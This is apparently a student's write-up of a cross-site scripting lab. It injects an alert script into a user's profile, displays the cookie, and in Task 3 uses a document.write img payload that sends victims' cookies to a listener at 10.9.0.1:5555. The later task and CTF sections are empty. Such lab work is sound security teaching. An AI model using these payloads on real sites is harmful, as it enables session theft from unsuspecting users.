## Cross-Site Scripting Attack Lab

### Task 1
In this task we're asked to inject javascript code into a user's profile such that when that profile is loaded, an alert popup will show up with the message "XSS". <br>
In order to do so, firstly, we need to login into an user account. We chose Alice.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049736125780070481/image.png">

Then, we changed her Brief Description section to contain our javascript code: `<script>alert('XSS');</script>`

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049741154406633533/image.png">

Upon submiting the edit form, we're met with the expected popup, since the page reloads. Because the privacy of Alice's Brief Description section is set to public, any user that loads her profile should be met with the exact same popup.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049741154767347732/image.png">

### Task 2

With a small change to our code, we can display the user's cookies, instead of a random message: `<script>alert(document.cookie);</script>`

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049742743523578026/image.png">

Yet again, any user that loads this page will be met with the popup.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049742660442796092/image.png">

### Task 3

Because displaying the cookies to the user is not useful to us (it's beyond useless, since it actually warns the user that their cookies are under attack), we want to silently retrieve them. <br>
This can be achieved with a small piece of javascript code that creates a new `<img>` html element with its source pointing to a server we control, created using netcat: `<script>document.write(’<img src=http://10.9.0.1:5555?c=’+ escape(document.cookie) + ’ >’);</script>` <br>
When the browser tries to retrieve this image, it will send a GET request to our server with the cookie information attached.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049744046450548736/image.png">

As you can see, the browser sent the GET request, and it got to our server.

<img src="https://cdn.discordapp.com/attachments/799728570825179213/1049744563364954122/image.png">

### Task 4

## Week 10 CTF Challenge
### Challenge 1

### Challenge 2

